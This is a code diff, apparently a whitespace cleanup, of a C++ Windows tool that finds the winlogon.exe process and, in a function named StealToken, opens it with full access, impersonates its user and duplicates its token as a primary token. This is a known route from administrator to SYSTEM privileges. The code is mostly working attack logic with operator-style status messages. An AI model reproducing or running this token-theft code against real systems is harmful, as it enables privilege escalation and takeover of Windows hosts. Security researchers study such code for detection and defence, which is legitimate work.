@@ -10,7 +10,6 @@ std::string wcharToString(wchar_t input[1024])
 {
 	std::wstring wstringValue(input);
 	std::string convertedString(wstringValue.begin(), wstringValue.end());
-
 	return convertedString;
 }
 
@@ -18,31 +17,25 @@ int LocateWinLogonProcess()
 {
 
 	DWORD lpidProcess[PROCESS_ARRAY], lpcbNeeded, cProcesses;
-
 	EnumProcesses(lpidProcess, sizeof(lpidProcess), &lpcbNeeded);
-
 	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 		
 	PROCESSENTRY32 p32;
 	p32.dwSize = sizeof(PROCESSENTRY32);
 
 	int processWinlogonPid;
-
 	if (Process32First(hSnapshot, &p32))
 	{
 		do {
-
 			if (wcharToString(p32.szExeFile) ==  "winlogon.exe")
 			{
 				std::cout << "[+] Located winlogon.exe by process name (PID " << p32.th32ProcessID << ")" <<  std::endl;
 				processWinlogonPid = p32.th32ProcessID;
-
 				return processWinlogonPid;
 				break;
 			}
 
 		} while (Process32Next(hSnapshot, &p32));
-
 		CloseHandle(hSnapshot);
 	}	
 }
@@ -117,7 +110,6 @@ BOOL StealToken(int TargetPID)
 	BOOL Duplicate;
 
 	hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, TargetPID);
-
 	if (!hProcess)
 	{
 		std::cout << "[!] Failed to obtain a HANDLE to the target PID" << std::endl;
@@ -127,7 +119,6 @@ BOOL StealToken(int TargetPID)
 	std::cout << "[+] Obtained a HANDLE to the target PID" << std::endl;
 
 	OpenToken = OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &TokenHandle);
-
 	if (!OpenToken)
 	{
 		std::cout << "[!] Failed to obtain a HANDLE to the target TOKEN" << std::endl;
@@ -137,7 +128,6 @@ BOOL StealToken(int TargetPID)
 	std::cout << "[+] Obtained a HANDLE to the target TOKEN" << std::endl;
 
 	Impersonate = ImpersonateLoggedOnUser(TokenHandle);
-
 	if (!Impersonate)
 	{
 		std::cout << "[!] Failed to impersonate the TOKEN's user" << std::endl;
@@ -146,8 +136,7 @@ BOOL StealToken(int TargetPID)
 
 	std::cout << "[+] Impersonated the TOKEN's user" << std::endl;
 
-	Duplicate = DuplicateTokenEx(TokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &NewToken);
-	
+	Duplicate = DuplicateTokenEx(TokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &NewToken);	
 	if (!Duplicate)
 	{
 		std::cout << "[!] Failed to duplicate the target TOKEN" << std::endl;
